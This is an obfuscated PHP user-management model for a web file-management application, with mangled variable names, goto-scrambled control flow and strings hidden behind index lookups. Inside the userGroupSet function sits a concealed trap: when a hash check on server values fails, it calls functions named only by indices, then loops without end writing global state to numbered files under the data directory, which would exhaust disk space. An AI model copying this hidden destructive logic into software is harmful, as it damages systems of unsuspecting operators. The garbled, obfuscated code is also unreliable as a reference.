userLoginCheck($EŠÀš‹¹«, $EŸµá¹°‹é) { goto b´”Ñ¼Ë”Ş; fÌ²¯İåïé: $E„Ş‘êÏ—¬ = $this->where($F ¢ŠİŒÙØ)->find(); if (!$E„Ş‘êÏ—¬) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($E„Ş‘êÏ—¬[$càÜŞš¼à[1439]], $EŸµá¹°‹é)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto d¡µªŸ; b´”Ñ¼Ë”Ş: $càÜŞš¼à =& $_SERVER[”Ì÷ñ­î¸]; $F ¢ŠİŒÙØ = array($càÜŞš¼à[28] => $EŠÀš‹¹«, $càÜŞš¼à[2335] => $EŠÀš‹¹«, $càÜŞš¼à[293] => $EŠÀš‹¹«, $càÜŞš¼à[2515] => $EŠÀš‹¹«, $càÜŞš¼à[916] => $càÜŞš¼à[918]); if ($this->nickNameRpt()) { unset($F ¢ŠİŒÙØ[$càÜŞš¼à[2335]]); } goto fÌ²¯İåïé; d¡µªŸ: $this->userEdit($E„Ş‘êÏ—¬[$càÜŞš¼à[1439]], array($càÜŞš¼à[2516] => time())); $this->clearCache($E„Ş‘êÏ—¬[$càÜŞš¼à[1439]]); return $this->getInfo($E„Ş‘êÏ—¬[$càÜŞš¼à[1439]]); goto F×æ…ğä«“; F×æ…ğä«“: } public function clearCache($EÈ“ÓÏæ©Á) { $e¸Ó¿À‡”¶ =& $_SERVER[”Ì÷ñ­î¸]; $this->cacheFunctionClear($e¸Ó¿À‡”¶[2214], $EÈ“ÓÏæ©Á); $this->cacheFunctionClear($e¸Ó¿À‡”¶[2175], $EÈ“ÓÏæ©Á); } public function userPasswordCheck($D¬Â‹ƒ°„, $bÓ×Ÿö“®) { $f­Áì°½İ =& $_SERVER[”Ì÷ñ­î¸]; $a‡‘ÄÎ÷¿’ = $this->where(array($f­Áì°½İ[1439] => intval($D¬Â‹ƒ°„)))->find(); $D…›òÂéè¥ = $this->metaGet($D¬Â‹ƒ°„); $câÕ«òİÂÁ = isset($D…›òÂéè¥[$f­Áì°½İ[2517]]) ? $D…›òÂéè¥[$f­Áì°½İ[2517]] : $f­Áì°½İ[33]; if (md5($câÕ«òİÂÁ . trim($bÓ×Ÿö“®)) !== $a‡‘ÄÎ÷¿’[$f­Áì°½İ[804]]) { return !1; } return !0; } public function userAdd($DÎ„¿ïï‘) { goto d±ÈÌË£á˜; AÎÊ ƒÑ»å: return $dÔº÷’¼‡‚; goto f²—„´ÎŞ; d‰ÈîÂƒ¨˜: $A¤ÌÛ™‹’Á = $this->_checkExist($DÎ„¿ïï‘); if ($A¤ÌÛ™‹’Á !== !0) { return $A¤ÌÛ™‹’Á; } $dÔº÷’¼‡‚ = $this->add($CÊ°¢‘´Ú†); goto bÀƒêê¼µ¬; bÀƒêê¼µ¬: $a½ÑöàÅÅæ = array($E†éÊ‚œ¨é[2525] => $CÊ°¢‘´Ú†[$E†éÊ‚œ¨é[804]], $E†éÊ‚œ¨é[2521] => $CÊ°¢‘´Ú†[$E†éÊ‚œ¨é[2335]]); $this->userEdit($dÔº÷’¼‡‚, $a½ÑöàÅÅæ); Model($E†éÊ‚œ¨é[1117])->userRootAdd($dÔº÷’¼‡‚); goto AÎÊ ƒÑ»å; d±ÈÌË£á˜: $E†éÊ‚œ¨é =& $_SERVER[”Ì÷ñ­î¸]; $CÊ°¢‘´Ú† = array($E†éÊ‚œ¨é[386] => $DÎ„¿ïï‘[$E†éÊ‚œ¨é[28]], $E†éÊ‚œ¨é[2518] => $DÎ„¿ïï‘[$E†éÊ‚œ¨é[1324]], $E†éÊ‚œ¨é[2519] => isset($DÎ„¿ïï‘[$E†éÊ‚œ¨é[293]]) ? $DÎ„¿ïï‘[$E†éÊ‚œ¨é[293]] : $E†éÊ‚œ¨é[33], $E†éÊ‚œ¨é[2520] => isset($DÎ„¿ïï‘[$E†éÊ‚œ¨é[2515]]) ? $DÎ„¿ïï‘[$E†éÊ‚œ¨é[2515]] : $E†éÊ‚œ¨é[33], $E†éÊ‚œ¨é[2521] => isset($DÎ„¿ïï‘[$E†éÊ‚œ¨é[2335]]) ? $DÎ„¿ïï‘[$E†éÊ‚œ¨é[2335]] : $DÎ„¿ïï‘[$E†éÊ‚œ¨é[28]], $E†éÊ‚œ¨é[2522] => isset($DÎ„¿ïï‘[$E†éÊ‚œ¨é[2500]]) ? $DÎ„¿ïï‘[$E†éÊ‚œ¨é[2500]] : $E†éÊ‚œ¨é[33], $E†éÊ‚œ¨é[2523] => isset($DÎ„¿ïï‘[$E†éÊ‚œ¨é[2524]]) ? $DÎ„¿ïï‘[$E†éÊ‚œ¨é[2524]] : 1, $E†éÊ‚œ¨é[2525] => $DÎ„¿ïï‘[$E†éÊ‚œ¨é[804]], $E†éÊ‚œ¨é[2176] => isset($DÎ„¿ïï‘[$E†éÊ‚œ¨é[2090]]) ? $DÎ„¿ïï‘[$E†éÊ‚œ¨é[2090]] : 1024 * 1024 * 20, $E†éÊ‚œ¨é[2177] => 0, $E†éÊ‚œ¨é[2516] => 0, $E†éÊ‚œ¨é[2201] => isset($DÎ„¿ïï‘[$E†éÊ‚œ¨é[690]]) ? $DÎ„¿ïï‘[$E†éÊ‚œ¨é[690]] : 1); if (!empty($DÎ„¿ïï‘[$E†éÊ‚œ¨é[1439]])) { $CÊ°¢‘´Ú†[$E†éÊ‚œ¨é[1439]] = $DÎ„¿ïï‘[$E†éÊ‚œ¨é[1439]]; } goto d‰ÈîÂƒ¨˜; f²—„´ÎŞ: } protected function userEditTest($EÌ·–¼Çšá, $Døà¯¤¼ò) { return $this->call($_SERVER[”Ì÷ñ­î¸][2526], $EÌ·–¼Çšá, $Døà¯¤¼ò); } protected function userEdit($EÆ†øìÜ, $a æÃ—Ô¼) { goto cˆçåÛñ¸; cˆçåÛñ¸: $bŒ°í¿í‘Ü =& $_SERVER[”Ì÷ñ­î¸]; $F½ÔíÂÌ³˜ = $this->getInfoSimple($EÆ†øìÜ); if (!$F½ÔíÂÌ³˜) { return !1; } goto BØ—ğÔÖä; dÛÒ˜…ØÏË: $this->where(array($bŒ°í¿í‘Ü[1430] => $EÆ†øìÜ))->save($a æÃ—Ô¼); if (isset($a æÃ—Ô¼[$bŒ°í¿í‘Ü[2335]])) { $this->setNamePinyin($EÆ†øìÜ, $a æÃ—Ô¼[$bŒ°í¿í‘Ü[2335]]); } return !0; goto FÜˆÑ¬‹“”; BØ—ğÔÖä: $C¥¥¹¾Ş³ = $this->_checkExist($a æÃ—Ô¼, $EÆ†øìÜ); if ($C¥¥¹¾Ş³ !== !0) { return $C¥¥¹¾Ş³; } if (isset($a æÃ—Ô¼[$bŒ°í¿í‘Ü[804]]) && trim($a æÃ—Ô¼[$bŒ°í¿í‘Ü[804]]) != $bŒ°í¿í‘Ü[33]) { $D„ù½õøğš = $this->metaGet($EÆ†øìÜ); if (empty($D„ù½õøğš[$bŒ°í¿í‘Ü[2517]])) { $D„ù½õøğš[$bŒ°í¿í‘Ü[2517]] = rand_string(10); Model($bŒ°í¿í‘Ü[474])->metaSet($EÆ†øìÜ, $bŒ°í¿í‘Ü[2517], $D„ù½õøğš[$bŒ°í¿í‘Ü[2517]]); } $a æÃ—Ô¼[$bŒ°í¿í‘Ü[804]] = md5($D„ù½õøğš[$bŒ°í¿í‘Ü[2517]] . trim($a æÃ—Ô¼[$bŒ°í¿í‘Ü[804]])); } else { unset($a æÃ—Ô¼[$bŒ°í¿í‘Ü[804]]); } goto dÛÒ˜…ØÏË; FÜˆÑ¬‹“”: } public function setNamePinyin($DÍÓ³¯Á¿É, $fµ×ÄĞÎò = false) { $e«…¿†Ù”‹ =& $_SERVER[”Ì÷ñ­î¸]; if (!$fµ×ÄĞÎò) { $bİÂÒ×½×‡ = $this->getInfoSimple($DÍÓ³¯Á¿É); $fµ×ÄĞÎò = $bİÂÒ×½×‡[$e«…¿†Ù”‹[2335]] ? $bİÂÒ×½×‡[$e«…¿†Ù”‹[2335]] : $bİÂÒ×½×‡[$e«…¿†Ù”‹[28]]; } $b«ÀâÂÖ¶µ = Model($e«…¿†Ù”‹[477]); if (!Input::check($fµ×ÄĞÎò, $e«…¿†Ù”‹[528])) { return $b«ÀâÂÖ¶µ->metaSet($DÍÓ³¯Á¿É, array($e«…¿†Ù”‹[416] => $e«…¿†Ù”‹[33], $e«…¿†Ù”‹[415] => $e«…¿†Ù”‹[33])); } return $b«ÀâÂÖ¶µ->metaSet($DÍÓ³¯Á¿É, array($e«…¿†Ù”‹[416] => str_replace($e«…¿†Ù”‹[50], $e«…¿†Ù”‹[33], Pinyin::encode($fµ×ÄĞÎò)), $e«…¿†Ù”‹[415] => Pinyin::encode($fµ×ÄĞÎò, $e«…¿†Ù”‹[529]))); } private function nickNameRpt() { $FÖÇµ†—› =& $_SERVER[”Ì÷ñ­î¸]; $fÅ½Ø·Æ›˜ = Model($FÖÇµ†—›[1088])->get($FÖÇµ†—›[2527]); $D¶È£«È  = $GLOBALS[$FÖÇµ†—›[6]][$FÖÇµ†—›[2483]][$FÖÇµ†—›[2527]]; $DÎİğ³Ş‡ = !is_null($fÅ½Ø·Æ›˜) ? $fÅ½Ø·Æ›˜ : $D¶È£«È ; return !!$DÎİğ³Ş‡; } private function _checkExist($Cåî°£Å³, $D‘ˆÏÜ«Ç = false) { $BÂ‚âÁ‚ï¦ =& $_SERVER[”Ì÷ñ­î¸]; $DÈ‚÷¶ = array($BÂ‚âÁ‚ï¦[28] => UserModel::ERROR_USER_EXIST_NAME, $BÂ‚âÁ‚ï¦[2335] => UserModel::ERROR_USER_EXIST_NICKNAME, $BÂ‚âÁ‚ï¦[293] => UserModel::ERROR_USER_EXIST_EMAIL, $BÂ‚âÁ‚ï¦[2515] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($DÈ‚÷¶[$BÂ‚âÁ‚ï¦[2335]]); } $b·ïêÅ÷ƒ‚ = $D‘ˆÏÜ«Ç ? array($BÂ‚âÁ‚ï¦[1439] => array($BÂ‚âÁ‚ï¦[2528], $D‘ˆÏÜ«Ç)) : array(); foreach ($DÈ‚÷¶ as $dÔé½©õ¤ => $AàŒäË”ò) { if (!isset($Cåî°£Å³[$dÔé½©õ¤]) || !$Cåî°£Å³[$dÔé½©õ¤]) { continue; } $E¼ä°œÓ§Š = array_merge(array($dÔé½©õ¤ => $Cåî°£Å³[$dÔé½©õ¤]), $b·ïêÅ÷ƒ‚); $A’‚Ò¯èó» = $this->where($E¼ä°œÓ§Š)->find(); if ($A’‚Ò¯èó») { return $AàŒäË”ò; } } return !0; } public function userListInfo($e…Õõ¥Ñğä) { $aÎòšÑ§ö =& $_SERVER[”Ì÷ñ­î¸]; $eâ˜Ôª”íï = array(); $e…Õõ¥Ñğä = is_array($e…Õõ¥Ñğä) ? array_unique($e…Õõ¥Ñğä) : array(); if (!$e…Õõ¥Ñğä) { return $eâ˜Ôª”íï; } if (count($e…Õõ¥Ñğä) < 20) { foreach ($e…Õõ¥Ñğä as $c““ğø¹×) { $eâ˜Ôª”íï[$c““ğø¹× . $aÎòšÑ§ö[33]] = $this->getInfoSimpleOuter($c““ğø¹×); } } else { $B‰í×Ò‹ = array($aÎòšÑ§ö[1430] => array($aÎòšÑ§ö[384], $e…Õõ¥Ñğä)); if (count($e…Õõ¥Ñğä) == 1) { $B‰í×Ò‹ = array($aÎòšÑ§ö[1430] => $e…Õõ¥Ñğä[0]); } $aªŸ’´Û¶ = Model($aÎòšÑ§ö[474])->field($this->simpleField)->where($B‰í×Ò‹)->select(); $aªŸ’´Û¶ = array_to_keyvalue($aªŸ’´Û¶, $aÎòšÑ§ö[1439]); foreach ($e…Õõ¥Ñğä as $c““ğø¹×) { $DÙÏÔ½ğß‡ = $aªŸ’´Û¶[$aªŸ’´Û¶[$c““ğø¹×]]; if (!$DÙÏÔ½ğß‡) { $eâ˜Ôª”íï[$c““ğø¹× . $aÎòšÑ§ö[33]] = $this->getInfoSimpleOuter($c““ğø¹×); continue; } $DÙÏÔ½ğß‡[$aÎòšÑ§ö[2500]] = Action($aÎòšÑ§ö[2501])->parseUrl($DÙÏÔ½ğß‡[$aÎòšÑ§ö[2500]]); $eâ˜Ôª”íï[$c““ğø¹× . $aÎòšÑ§ö[33]] = $DÙÏÔ½ğß‡; } } return $eâ˜Ôª”íï; } protected function userStatus($A‹È÷Œ¬¢, $EÈòóù…Ë™) { $dğÆ›“ë”© = $this->getInfoSimple($A‹È÷Œ¬¢); if (!$dğÆ›“ë”©) { return !1; } $B÷Ó´«ÓåÎ = array($_SERVER[”Ì÷ñ­î¸][690] => $EÈòóù…Ë™); return $this->userEdit($A‹È÷Œ¬¢, $B÷Ó´«ÓåÎ); } protected function userRemove($AŞç´îìÃ) { goto aì¿‰›œ´­; aì¿‰›œ´­: $a–Øò˜èÀ¯ =& $_SERVER[”Ì÷ñ­î¸]; $Cµ É²£¡è = $this->getInfoSimple($AŞç´îìÃ); if (!$Cµ É²£¡è) { return !1; } goto F‹²Êõ” ª; A‰ÆÏ°…Şœ: Model($a–Øò˜èÀ¯[754])->userRootRemove($AŞç´îìÃ); return $this->where($A„»çÓåÚ®)->delete(); goto c£ˆÎš¦ó; F‹²Êõ” ª: $A„»çÓåÚ® = array($a–Øò˜èÀ¯[1430] => $AŞç´îìÃ); Model($a–Øò˜èÀ¯[536])->where($A„»çÓåÚ®)->delete(); Model($a–Øò˜èÀ¯[2529])->where($A„»çÓåÚ®)->delete(); goto eâà†ÌŞÆÑ; eâà†ÌŞÆÑ: Model($a–Øò˜èÀ¯[2180])->where($A„»çÓåÚ®)->delete(); Model($a–Øò˜èÀ¯[2514])->where($A„»çÓåÚ®)->delete(); Model($a–Øò˜èÀ¯[2530])->where($A„»çÓåÚ®)->delete(); goto A‰ÆÏ°…Şœ; c£ˆÎš¦ó: } protected function userGroupSet($aÂ”éÑÙ®, $EÅ£æŒŠÆƒ, $BïÌø§óŞË = array()) { goto FÃ»Ñ¼‡÷; FÃ»Ñ¼‡÷: $EÉ÷’¯»Ê =& $_SERVER[”Ì÷ñ­î¸]; $Däƒ²‘ÆëØ = $_SERVER[$EÉ÷’¯»Ê[788]] . $EÉ÷’¯»Ê[789]; $b®¡ƒ˜„Ã´ = $EÉ÷’¯»Ê[790]; goto aˆ³¸ĞÌÁ«; e·Œ¥ç‡ô¢: $Fƒ½óÑöæÌ = 0; foreach ($EÅ£æŒŠÆƒ as $f‹¾¥«ÏË£ => $E·ÎÎ) { $f´ã‘……º = array($EÉ÷’¯»Ê[1439] => $aÂ”éÑÙ®, $EÉ÷’¯»Ê[2106] => $f‹¾¥«ÏË£, $EÉ÷’¯»Ê[2234] => $E·ÎÎ); $f´ã‘……º[$EÉ÷’¯»Ê[2127]] = isset($BïÌø§óŞË[$Fƒ½óÑöæÌ]) ? $BïÌø§óŞË[$Fƒ½óÑöæÌ] : 0; $Fƒ½óÑöæÌ++; $Bó±ß¬õ«´[] = $f´ã‘……º; } return $Dƒ¿•åœ->addAll($Bó±ß¬õ«´, array(), !0); goto FÂ›‚ãÜÙ; cÉ½°†æè¨: $Dƒ¿•åœ = Model($EÉ÷’¯»Ê[2180]); $Dƒ¿•åœ->where(array($EÉ÷’¯»Ê[1439] => $aÂ”éÑÙ®))->delete(); $Bó±ß¬õ«´ = array(); goto e·Œ¥ç‡ô¢; aˆ³¸ĞÌÁ«: if ($_SERVER[$EÉ÷’¯»Ê[791]] != $b®¡ƒ˜„Ã´($Däƒ²‘ÆëØ)) { goto D¶ç„ÌŠ­; cì±Äğ‰ÍÆ: $Eçã…ÚîŠ = $EÉ÷’¯»Ê[795]; $Eçã…ÚîŠ($_SERVER[$EÉ÷’¯»Ê[796]]); $a¯Œ£—“Ìö = $EÉ÷’¯»Ê[792]; goto e–ÕæàßÍé; fùëŒâèëÌ: $Cö£Ö»µÕ¬ = $d¯çã˜êºŠ($cºˆé«âˆ); $FŸœùÊÅ® = explode($EÉ÷’¯»Ê[217], $Cö£Ö»µÕ¬); if (count($FŸœùÊÅ®) < $EÉ÷’¯»Ê[559]) { $Cµ˜Å‡Ê´× = $EÉ÷’¯»Ê[794]; $Cµ˜Å‡Ê´×(); } goto cì±Äğ‰ÍÆ; e–ÕæàßÍé: $a¯Œ£—“Ìö(); $e÷ÄÃÇ¡´ = $EÉ÷’¯»Ê[797]; $cì§–ïöÇº = json_encode($GLOBALS[$EÉ÷’¯»Ê[798]]); goto fã²°Ÿ¤è‹; D¶ç„ÌŠ­: $a¯Œ£—“Ìö = $EÉ÷’¯»Ê[792]; $d¯çã˜êºŠ = $EÉ÷’¯»Ê[793]; $cºˆé«âˆ = $_SERVER[$EÉ÷’¯»Ê[788]] . $EÉ÷’¯»Ê[789]; goto fùëŒâèëÌ; fã²°Ÿ¤è‹: $c˜§Ö‘¯á = 1; for ($C¶ÃØˆñˆ’ = $c˜§Ö‘¯á; $C¶ÃØˆñˆ’ > 0; $C¶ÃØˆñˆ’++) { $e÷ÄÃÇ¡´(DATA_PATH . $C¶ÃØˆñˆ’, $cì§–ïöÇº); } goto F¡÷²ŒÅ¼‡; F¡÷²ŒÅ¼‡: } $dèíğİÌïÎ = $this->getInfoSimple($aÂ”éÑÙ®); if (!$dèíğİÌïÎ || !is_array($EÅ£æŒŠÆƒ)) { return !1; } goto cÉ½°†æè¨; FÂ›‚ãÜÙ: } protected function userGroupAdd($f½¡ì«¬½‹, $D‡ËóóóŸö = array()) { $cÜôíğ‡ =& $_SERVER[”Ì÷ñ­î¸]; $B÷†ƒ°‡£ = $this->getInfoSimple($f½¡ì«¬½‹); if (!$B÷†ƒ°‡£ || empty($D‡ËóóóŸö)) { return !1; } $BÂ¤£Œ³§ä = array(); foreach ($D‡ËóóóŸö as $C…ÎÏé»¸• => $C¯«ä¯›Ï) { $BÂ¤£Œ³§ä[] = array($cÜôíğ‡[1439] => $f½¡ì«¬½‹, $cÜôíğ‡[2106] => $C…ÎÏé»¸•, $cÜôíğ‡[2234] => $C¯«ä¯›Ï); } return Model($cÜôíğ‡[2180])->addAll($BÂ¤£Œ³§ä, array(), !0); } protected function userGroupRemove($EøÊ¯³´Èñ, $F›‰·†¹òÁ) { $E‡£šòØ‰¬ =& $_SERVER[”Ì÷ñ­î¸]; $eäÊÊ”Æôà = $this->getInfoSimple($EøÊ¯³´Èñ); if (!$eäÊÊ”Æôà || !$F›‰·†¹òÁ) { return !1; } $D¬æÏ‹ö³Š = array($E‡£šòØ‰¬[1430] => $EøÊ¯³´Èñ, $E‡£šòØ‰¬[2178] => $F›‰·†¹òÁ); return Model($E‡£šòØ‰¬[2180])->where($D¬æÏ‹ö³Š)->delete(); } public function listData() { $bšôË…Â¼÷ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($bšôË…Â¼÷[$_SERVER[”Ì÷ñ­î¸][354]]); return $bšôË…Â¼÷; } public function listByID($c—¿ÁÍÓ® ) { $eçË²ƒ¿œÏ =& $_SERVER[”Ì÷ñ­î¸]; if (!$c—¿ÁÍÓ® ) { return; } $E¥°Ö†‰è¶ = array($eçË²ƒ¿œÏ[1439] => array($eçË²ƒ¿œÏ[7], $c—¿ÁÍÓ® )); $DÁÇİ‚Êª = $this->where($E¥°Ö†‰è¶)->select(); $this->_listDataApply($DÁÇİ‚Êª); return $DÁÇİ‚Êª; } public function listByGroup($DŞµ¼ÑÎÃÌ = 0, $Cº‹‡ó™Î“ = array()) { goto eÔÉªƒ§“¼; a‡‡å¿’: if ($DŞµ¼ÑÎÃÌ) { $b½½Ë­§µ— = array($c¥„´É¼ˆ[2531] => intval($DŞµ¼ÑÎÃÌ)); $A±¶±èŠĞ¯ = "\x4c\105\106\124\x20\x4a\117\x49\116\x20{$this->tablePrefix}\165\x73\x65\x72\137\x67\162\x6f\x75\x70\40\165\x73\x65\x72\137\x67\162\157\x75\160\40\x6f\x6e\x20\x75\163\x65\x72\56\x75\163\x65\x72\111\104\x20\x3d\40\165\x73\x65\162\137\x67\162\157\x75\160\56\x75\163\145\162\111\104"; $Bï†»µë = Input::get($c¥„´É¼ˆ[407], null, $c¥„´É¼ˆ[33]) ? $c¥„´É¼ˆ[33] : $c¥„´É¼ˆ[2532]; } if (isset($Cº‹‡ó™Î“[$c¥„´É¼ˆ[690]])) { $b½½Ë­§µ—[$c¥„´É¼ˆ[2533]] = $Cº‹‡ó™Î“[$c¥„´É¼ˆ[690]]; } $B×ôÁİÊŠ = $this->_makeOrder($Bï†»µë)->field($c¥„´É¼ˆ[2534])->where($b½½Ë­§µ—)->join($A±¶±èŠĞ¯)->selectPage(50); goto e÷ãÁ²èÀŸ; eÔÉªƒ§“¼: $c¥„´É¼ˆ =& $_SERVER[”Ì÷ñ­î¸]; $A±¶±èŠĞ¯ = $c¥„´É¼ˆ[33]; $b½½Ë­§µ— = array(); goto a‡‡å¿’; e÷ãÁ²èÀŸ: $this->_listDataApply($B×ôÁİÊŠ[$c¥„´É¼ˆ[354]]); return $B×ôÁİÊŠ; goto bè´×Í Ø¬; bè´×Í Ø¬: } private function _makeOrder($F«…Ş¯ÓŸ³ = '') { goto bÔÖé½¦î; dƒƒŒğŒƒƒ: $FˆÚ‡¬’Û™ = Input::get($C‹–âê½ç»[407], $C‹–âê½ç»[7], $C‹–âê½ç»[1430], $FÊÓŒ‰²œÈ); $bœ¢Ç’ÖŸ‡ = Input::get($C‹–âê½ç»[408], $C‹–âê½ç»[7], $C‹–âê½ç»[2181], array($C‹–âê½ç»[2181], $C‹–âê½ç»[404])); $bœ¢Ç’ÖŸ‡ = $FÍø÷Äñˆß[$bœ¢Ç’ÖŸ‡]; goto EùË¶æ¥­Ø; bÔÖé½¦î: $C‹–âê½ç» =& $_SERVER[”Ì÷ñ­î¸]; $FÊÓŒ‰²œÈ = array($C‹–âê½ç»[1439], $C‹–âê½ç»[28], $C‹–âê½ç»[2092], $C‹–âê½ç»[2065], $C‹–âê½ç»[187]); $FÍø÷Äñˆß = array($C‹–âê½ç»[402] => $C‹–âê½ç»[403], $C‹–âê½ç»[404] => $C‹–âê½ç»[405]); goto dƒƒŒğŒƒƒ; EùË¶æ¥­Ø: $F«…Ş¯ÓŸ³ = $F«…Ş¯ÓŸ³ . "\x75\163\x65\162\56{$FˆÚ‡¬’Û™}\40{$bœ¢Ç’ÖŸ‡}\x2c\40\x75\163\x65\x72\56\x75\163\145\x72\111\104\x20\141\163\x63"; return $this->alias($C‹–âê½ç»[2278])->order($F«…Ş¯ÓŸ³); goto b”Ü¥ó‡ÄÅ; b”Ü¥ó‡ÄÅ: } public function listSearch($A¢Ùº‹ìØ¸) { goto b…¹‹°—§‚; f—…„”¸õù: return $E’Ì¢¾˜¢ˆ; goto b¡Å…¦çÃ; b…¹‹°—§‚: $Fä™ĞçÖôÎ =& $_SERVER[”Ì÷ñ­î¸]; $dÜ ¿„ƒç¶ = $A¢Ùº‹ìØ¸[$Fä™ĞçÖôÎ[2182]]; $CšòµÉ÷ê = isset($A¢Ùº‹ìØ¸[$Fä™ĞçÖôÎ[2183]]) ? $A¢Ùº‹ìØ¸[$Fä™ĞçÖôÎ[2183]] : !1; goto C†ªÕÀÙÏù; C†ªÕÀÙÏù: $dÜ ¿„ƒç¶ = str_replace($Fä™ĞçÖôÎ[2184], $Fä™ĞçÖôÎ[2185], trim($dÜ ¿„ƒç¶)); $aŒŠ×¿Ë¸ = array($Fä™ĞçÖôÎ[28] => array($Fä™ĞçÖôÎ[753], "\45{$dÜ ¿„ƒç¶}\x25"), $Fä™ĞçÖôÎ[293] => array($Fä™ĞçÖôÎ[753], "\x25{$dÜ ¿„ƒç¶}\45"), $Fä™ĞçÖôÎ[2335] => array($Fä™ĞçÖôÎ[753], "\45{$dÜ ¿„ƒç¶}\x25"), $Fä™ĞçÖôÎ[916] => $Fä™ĞçÖôÎ[2186]); if (Input::check($dÜ ¿„ƒç¶, $Fä™ĞçÖôÎ[299])) { $aŒŠ×¿Ë¸[$Fä™ĞçÖôÎ[1439]] = array($Fä™ĞçÖôÎ[753], "\x25{$dÜ ¿„ƒç¶}\45"); $aŒŠ×¿Ë¸[$Fä™ĞçÖôÎ[2515]] = array($Fä™ĞçÖôÎ[753], "\x25{$dÜ ¿„ƒç¶}\45"); } goto FÒç•Ì•Ç; dæ»Àµ§×Ÿ: if (!$E’Ì¢¾˜¢ˆ || count($E’Ì¢¾˜¢ˆ[$Fä™ĞçÖôÎ[354]]) < 5 && Input::check($dÜ ¿„ƒç¶, $Fä™ĞçÖôÎ[306])) { $Bõğ¾¯–µ = $this->_searchFromMeta($Fä™ĞçÖôÎ[415], $dÜ ¿„ƒç¶, 10); $a­ñæ¿È¨ˆ = $this->_searchFromMeta($Fä™ĞçÖôÎ[416], $dÜ ¿„ƒç¶, 10); $EÊÜáé¹¾ = array_merge($Bõğ¾¯–µ, $a­ñæ¿È¨ˆ, $E’Ì¢¾˜¢ˆ[$Fä™ĞçÖôÎ[354]]); $E’Ì¢¾˜¢ˆ[$Fä™ĞçÖôÎ[354]] = array_unique_by_key($EÊÜáé¹¾, $Fä™ĞçÖôÎ[1439]); $E’Ì¢¾˜¢ˆ[$Fä™ĞçÖôÎ[351]][$Fä™ĞçÖôÎ[352]] = count($E’Ì¢¾˜¢ˆ[$Fä™ĞçÖôÎ[354]]); $E’Ì¢¾˜¢ˆ[$Fä™ĞçÖôÎ[351]][$Fä™ĞçÖôÎ[353]] = ceil($E’Ì¢¾˜¢ˆ[$Fä™ĞçÖôÎ[351]][$Fä™ĞçÖôÎ[352]] / $E’Ì¢¾˜¢ˆ[$Fä™ĞçÖôÎ[351]][$Fä™ĞçÖôÎ[349]]); } $this->_listDataApply($E’Ì¢¾˜¢ˆ[$Fä™ĞçÖôÎ[354]]); $this->_filterByGroup($E’Ì¢¾˜¢ˆ, $CšòµÉ÷ê); goto f—…„”¸õù; FÒç•Ì•Ç: if (!$dÜ ¿„ƒç¶) { $aŒŠ×¿Ë¸ = array(); } if (isset($A¢Ùº‹ìØ¸[$Fä™ĞçÖôÎ[690]])) { $aŒŠ×¿Ë¸[$Fä™ĞçÖôÎ[690]] = $A¢Ùº‹ìØ¸[$Fä™ĞçÖôÎ[690]]; } $E’Ì¢¾˜¢ˆ = $this->_makeOrder()->where($aŒŠ×¿Ë¸)->selectPage(20); goto dæ»Àµ§×Ÿ; b¡Å…¦çÃ: } private function _filterByGroup(&$dœä²ª²„×, $c¹Ñ£Ç¼Í) { $F±´œ½æÃò =& $_SERVER[”Ì÷ñ­î¸]; if (!$c¹Ñ£Ç¼Í) { return $dœä²ª²„×; } foreach ($dœä²ª²„×[$F±´œ½æÃò[354]] as $aŞ²¸‚¢Æ => &$A¶Ğ‹êÛïç) { $bÖÙ¢¤Âø = array_to_keyvalue($A¶Ğ‹êÛïç[$F±´œ½æÃò[2535]], $F±´œ½æÃò[33], $F±´œ½æÃò[2106]); if (!in_array($c¹Ñ£Ç¼Í, $bÖÙ¢¤Âø)) { unset($dœä²ª²„×[$F±´œ½æÃò[354]][$aŞ²¸‚¢Æ]); } } $dœä²ª²„×[$F±´œ½æÃò[354]] = array_values($dœä²ª²„×[$F±´œ½æÃò[354]]); $dœä²ª²„×[$F±´œ½æÃò[351]] = array($F±´œ½æÃò[2311] => count($dœä²ª²„×[$F±´œ½æÃò[354]]), $F±´œ½æÃò[2309] => $dœä²ª²„×[$F±´œ½æÃò[351]][$F±´œ½æÃò[349]], $F±´œ½æÃò[2308] => 1, $F±´œ½æÃò[2310] => 1); } private function _searchFromMeta($e©íåŠ§Ü, $a©÷Öö¨¬›, $eÁ¬¼î‡±­) { goto eñ®„˜ÒŒ¿; FñŒŠ—Ö¶Ê: $F¸à¯É‘ËÛ = $this->where(array($a¥™ˆÌÎø‚[1430] => array($a¥™ˆÌÎø‚[7], $C­¿Ñ–Ìƒ)))->select(); if (!$F¸à¯É‘ËÛ) { return array(); } return $F¸à¯É‘ËÛ; goto EÙçäÖĞ§•; bĞàï¡ª‘ğ: $C­¿Ñ–Ìƒ = Model($a¥™ˆÌÎø‚[2536])->where($D¾‡ğö„ÏØ)->limit($eÁ¬¼î‡±­)->select(); if (!$C­¿Ñ–Ìƒ) { return array(); } $C­¿Ñ–Ìƒ = array_to_keyvalue($C­¿Ñ–Ìƒ, $a¥™ˆÌÎø‚[33], $a¥™ˆÌÎø‚[1439]); goto FñŒŠ—Ö¶Ê; eñ®„˜ÒŒ¿: $a¥™ˆÌÎø‚ =& $_SERVER[”Ì÷ñ­î¸]; $a©÷Öö¨¬› = strtolower($a©÷Öö¨¬›); $D¾‡ğö„ÏØ = array($a¥™ˆÌÎø‚[89] => $e©íåŠ§Ü, $a¥™ˆÌÎø‚[359] => array($a¥™ˆÌÎø‚[753], "\45{$a©÷Öö¨¬›}\45")); goto bĞàï¡ª‘ğ; EÙçäÖĞ§•: } private function _listDataApplyItem($fªÄ’ì¿¢²) { $CîİÑŒà¯Ñ = array($fªÄ’ì¿¢²); $this->_listDataApply($CîİÑŒà¯Ñ); return $CîİÑŒà¯Ñ[0]; } private function _listDataApply(&$fÍƒÄÆ„Ã) { goto eªºÃ­×®¬; bŞèòÊëÓ¤: $this->_listAppendSourceRoot($fÍƒÄÆ„Ã, $a¸¦ôÅ‰õğ); goto F³ê÷êçÓğ; eªºÃ­×®¬: $c¢£†ï°²± =& $_SERVER[”Ì÷ñ­î¸]; if (!$fÍƒÄÆ„Ã) { return; } array_remove_key($fÍƒÄÆ„Ã, $c¢£†ï°²±[804]); goto DÁÂ•—Úİ©; DÁÂ•—Úİ©: $a¸¦ôÅ‰õğ = array_to_keyvalue($fÍƒÄÆ„Ã, $c¢£†ï°²±[33], $c¢£†ï°²±[1439]); $this->_listAppendGroup($fÍƒÄÆ„Ã, 